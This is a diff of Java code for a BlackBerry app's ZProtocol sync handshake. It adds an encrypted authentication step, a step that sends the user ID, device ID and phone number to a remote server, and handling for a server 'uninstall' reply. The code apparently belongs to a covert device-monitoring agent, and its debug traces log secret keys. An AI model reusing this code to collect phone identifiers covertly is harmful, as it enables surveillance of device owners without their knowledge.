@@ -3,6 +3,7 @@ package blackberry.action.sync.protocol;
 
 import net.rim.device.api.crypto.RandomSource;
 import net.rim.device.api.crypto.SHA1Digest;
+import net.rim.device.api.util.ByteVector;
 import net.rim.device.api.util.DataBuffer;
 import blackberry.Device;
 import blackberry.action.sync.Protocol;
@@ -15,6 +16,7 @@ import blackberry.transfer.Proto;
 import blackberry.transfer.ProtocolException;
 import blackberry.utils.Check;
 import blackberry.utils.Utils;
+import blackberry.utils.WChar;
 
 public class ZProtocol extends Protocol {
 
@@ -39,37 +41,121 @@ public class ZProtocol extends Protocol {
         //#endif
 
         try {
-            byte[] authResult = cypherCommand(forgeAuthentication());
-            decodeAuth(authResult);
+            //#ifdef DEBUG
+            debug.trace("start: sending Authentication");
+            //#endif          
+
+            byte[] cypherOut = crypto.encryptData(forgeAuthentication());
+            //#ifdef DEBUG
+            debug.trace("start: decoding Auth Answer");
+            //#endif          
+            decodeAuth(transport.command(cypherOut));
+
+            byte[] resId = cypherCommand(forgeIdentification());
+            checkOk(resId);
+
+            return true;
 
         } catch (TransportException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            //#endif
             return false;
         }
-        return false;
+    }
+
+    private void checkOk(byte[] result) throws ProtocolException {
+        int res = Utils.byteArrayToInt(result, 0);
+        if (res != Proto.OK) {
+            //#ifdef DEBUG
+            debug.error("checkOk: " + res);
+            //#endif
+
+            throw new ProtocolException();
+        }
+    }
+
+    private byte[] forgeIdentification() {
+        final Device device = Device.getInstance();
+        device.refreshData();
+
+        byte[] userid = WChar.pascalize(device.getWUserId());
+        byte[] deviceid = WChar.pascalize(device.getWDeviceId());
+        byte[] phone = WChar.pascalize(device.getWPhoneNumber());
+
+        int len = 8 + userid.length + deviceid.length + phone.length;
+
+        byte[] content = new byte[len];
+
+        DataBuffer dataBuffer = new DataBuffer(content,0,content.length,false);
+        dataBuffer.writeInt(Proto.ID);
+        dataBuffer.write(Device.getVersion());
+        dataBuffer.write(userid);
+        dataBuffer.write(deviceid);
+        dataBuffer.write(phone);
+                      
+        //#ifdef DBC
+        Check.ensures(dataBuffer.getPosition() == content.length, "forgeIdentification pos: " + dataBuffer.getPosition());
+        //#endif
+
+        //#ifdef DEBUG
+        debug.trace("forgeIdentification: " + Utils.byteArrayToHex(content));
+        //#endif
+        return content;
     }
 
     private byte[] forgeAuthentication() {
         Keys keys = Keys.getInstance();
 
         byte[] data = new byte[104];
-        DataBuffer dataBuffer = new DataBuffer(data, 0, 104, false);
+        DataBuffer dataBuffer = new DataBuffer(data, 0, data.length, false);
 
         // filling structure
         dataBuffer.write(Kd);
         dataBuffer.write(Nonce);
 
-        dataBuffer.write(keys.getBuildId());
+        //#ifdef DBC
+        Check.ensures(dataBuffer.getPosition() == 32,
+                "forgeAuthentication, wrong array size");
+        //#endif
+
+        dataBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
         dataBuffer.write(keys.getInstanceId());
-        dataBuffer.write(Device.getSubtype());
+        dataBuffer.write(Utils.padByteArray(Device.getSubtype(), 16));
+
+        //#ifdef DBC
+        Check.ensures(dataBuffer.getPosition() == 84,
+                "forgeAuthentication, wrong array size");
+        //#endif
 
         // calculating digest
+        byte[] shaInput = new byte[68];
+        DataBuffer shaBuffer = new DataBuffer(shaInput, 0, shaInput.length,
+                false);
+        shaBuffer.write(Utils.padByteArray(keys.getBuildId(), 16));
+        shaBuffer.write(keys.getInstanceId());
+        shaBuffer.write(Utils.padByteArray(Device.getSubtype(), 16));
+        shaBuffer.write(keys.getConfKey());
+
         final SHA1Digest digest = new SHA1Digest();
-        digest.update(keys.getBuildId());
+        digest.update(Utils.padByteArray(keys.getBuildId(), 16));
         digest.update(keys.getInstanceId());
-        digest.update(Device.getSubtype());
-        digest.update(keys.getAesKey());
+        digest.update(Utils.padByteArray(Device.getSubtype(), 16));
+        digest.update(keys.getConfKey());
 
         byte[] sha1 = digest.getDigest();
+        byte[] sha1_bis = Encryption.SHA1(shaInput);
+
+        //#ifdef DEBUG
+        debug.trace("forgeAuthentication shaInput = "
+                + Utils.byteArrayToHex(shaInput));
+        debug.trace("forgeAuthentication sha1 = " + Utils.byteArrayToHex(sha1));
+        debug.trace("forgeAuthentication sha1_bis = "
+                + Utils.byteArrayToHex(sha1_bis));
+
+        debug.trace("forgeAuthentication confKey="
+                + Utils.byteArrayToHex(keys.getConfKey()));
+        //#endif
 
         // appending digest
         dataBuffer.write(sha1);
@@ -91,15 +177,24 @@ public class ZProtocol extends Protocol {
                 + authResult.length);
         //#endif
 
+        //#ifdef DEBUG
+        debug.trace("decodeAuth result = " + Utils.byteArrayToHex(authResult));
+        //#endif
+
         // Retrieve K
         byte[] cypherKs = new byte[16];
         Utils.copy(cypherKs, authResult, cypherKs.length);
         byte[] Ks = crypto.decryptData(cypherKs);
 
+        //#ifdef DEBUG
+        debug.trace("decodeAuth Kd=" + Utils.byteArrayToHex(Kd));
+        debug.trace("decodeAuth Ks=" + Utils.byteArrayToHex(Ks));
+        //#endif
+
         final SHA1Digest digest = new SHA1Digest();
         digest.update(Ks);
         digest.update(Kd);
-        digest.update(Keys.getInstance().getAesKey());
+        digest.update(Keys.getInstance().getConfKey());
 
         byte[] K = new byte[16];
         Utils.copy(K, digest.getDigest(), K.length);
@@ -119,28 +214,29 @@ public class ZProtocol extends Protocol {
         debug.trace("decodeAuth plainNonceCap="
                 + Utils.byteArrayToHex(plainNonceCap));
         //#endif
-        
-        boolean nonceOK = Utils.equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
+
+        boolean nonceOK = Utils
+                .equals(Nonce, 0, plainNonceCap, 0, Nonce.length);
         //#ifdef DEBUG
         debug.trace("decodeAuth nonceOK: " + nonceOK);
         //#endif
-        if(nonceOK){
-            int cap = Utils.byteArrayToInt(plainNonceCap, 32);
-            if(cap == Proto.OK){
+        if (nonceOK) {
+            int cap = Utils.byteArrayToInt(plainNonceCap, 16);
+            if (cap == Proto.OK) {
                 //#ifdef DEBUG
                 debug.trace("decodeAuth Proto OK");
                 //#endif
-            }else if (cap == Proto.UNINSTALL) {
+            } else if (cap == Proto.UNINSTALL) {
                 //#ifdef DEBUG
                 debug.trace("decodeAuth Proto Uninstall");
                 //#endif
-            }else{
+            } else {
                 //#ifdef DEBUG
                 debug.trace("decodeAuth error: " + cap);
                 //#endif
                 throw new ProtocolException();
             }
-        }else{
+        } else {
             throw new ProtocolException();
         }
 
